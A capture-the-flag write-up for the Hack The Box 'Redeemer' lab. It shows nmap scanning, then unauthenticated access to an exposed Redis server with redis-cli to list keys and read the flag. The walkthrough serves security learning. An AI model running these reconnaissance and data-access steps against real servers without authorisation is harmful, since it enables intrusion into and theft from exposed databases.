# HTB - Redeemer

#very-easy #linux

[TOC]

#### Which TCP port is open on the machine?

6379

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 17:12 UTC
Nmap scan report for 10.129.136.187
Host is up (0.044s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 14.33 seconds
```

#### Which service is running on the port that is open on the machine?

redis

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sC -sV -p 6379                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 17:14 UTC
Nmap scan report for 10.129.136.187
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

#### What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database

In-memory Database

#### Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments

redis-cli

#### Which flag is used with the Redis command-line utility to specify the hostname?

`-h`

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ redis-cli -h $IP
10.129.136.187:6379> 
```

#### Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

info

```bash
10.129.136.187:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
<SNIP>
```

#### What is the version of the Redis server being used on the target machine?

5.0.7

```bash
10.129.136.187:6379> info
# Server
redis_version:5.0.7
```

#### Which command is used to select the desired database in Redis?

select

#### How many keys are present inside the database with index 0?

4

```bash
10.129.136.187:6379> select 0
OK
10.129.136.187:6379> info keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

#### Which command is used to obtain all the keys in a database?

`keys *`

```bash
10.129.136.187:6379> keys *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

#### Submit root flag

```bash
10.129.136.187:6379> get flag
"03e1...
```

